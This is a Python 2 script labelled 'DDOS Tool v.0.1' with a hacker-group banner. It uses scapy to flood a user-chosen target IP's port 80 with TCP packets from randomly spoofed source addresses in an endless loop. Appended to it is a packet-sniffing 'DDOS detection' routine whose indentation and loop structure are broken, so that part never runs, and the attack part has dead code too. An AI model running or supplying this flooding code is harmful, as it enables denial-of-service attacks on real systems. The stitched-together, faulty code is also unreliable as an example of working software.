#!/usr/bin/python

# Change the script to your name aint gonna make you the coder!!!
#
# For anny bugs pleasse contact me on twitter
# https://twitter.com/L37h4lR0073r
#                            Have Fun!!

print "\t\t/////////////////////////////////////////////////\n";
print "\t\t_________________________________________________\n";
print "\t\t    _  _     _____         _____       _    _ \n";
print "\t\t  _| || |_  |  __ \       / ____|     | |  | |\n";
print "\t\t |_  __  _| | |  | |     | |          | |  | |\n";
print "\t\t  _| || |_  | |  | |     | |          | |  | |\n";
print "\t\t |_  __  _| | |__| |  _  | |____   _  | |__| |\n";
print "\t\t   |_||_|   |_____/  (_)  \_____| (_)  \____/ \n";
print "\t\t\t\t DDOS Tool v.0.1\n";
print "\t\t\t\t Coded By\n";
print "\t\t\t\t Dutch Cyber Unity\n";
print "\t\t\t\t For any Problems Contact me\n";
print "\t\t\t\t https://twitter.com/L37h4lR0073r\n";
print "\t\t_________________________________________________\n";
print "\t\t\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n";
print "\n\n";

import random
import socket
import struct

from scapy.all import *
src = raw_input("Enter Your Spoofed IP ")
target = raw_input("Enter the Target IP ")
srcport = int(raw_input("Enter the Port "))
i=1
while True:
    a = str(random.randint(1,254))
    b = str(random.randint(1,254))
    c = str(random.randint(1,254))
    d = str(random.randint(1,254))
    dot = "."
    src = a+dot+b+dot+c+dot+d
    print src
    st = random.randint(1,1000)
    en = random.randint(1000,65535)
    loop_break = 0
    for srcport in range(st,en):
        IP1 = IP(src=src, dst=target)
        TCP1 = TCP(sport=srcport, dport=80)
    IP1 = IP(src=src, dst=target)
    TCP1 = TCP(sport=srcport, dport=80)
    pkt = IP1 / TCP1
    send(pkt,inter= .000)
    print "~~~~~~~~~~> Dutch Cyber Unity Sending Packets <~~~~~~~~~~", i
    i=i+1
    if loop_break ==50 :
        break
from datetime import datetime
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
dict = {}
file_txt = open("dos.txt",'a')
file_txt.writelines("**********")
t1= str(datetime.now())
file_txt.writelines(t1)
file_txt.writelines("**********")
file_txt.writelines("\n")
print "Detection Start ......."
D_val =10
D_val1 = D_val+10
while True:
    pkt = s.recvfrom(2048)
ipheader = pkt[0][14:34]
ip_hdr = struct.unpack("!8sB3s4s4s",ipheader)
IP = socket.inet_ntoa(ip_hdr[3])
print "Source IP", IP
if dict.has_key(IP):
    dict[IP]=dict[IP]+1
    print dict[IP]
    if(dict[IP]>D_val) and (dict[IP]<D_val1) :

        line = "DDOS Detected "
        file_txt.writelines(line)
        file_txt.writelines(IP)
        file_txt.writelines("\n")

    else:
        dict[IP]=1
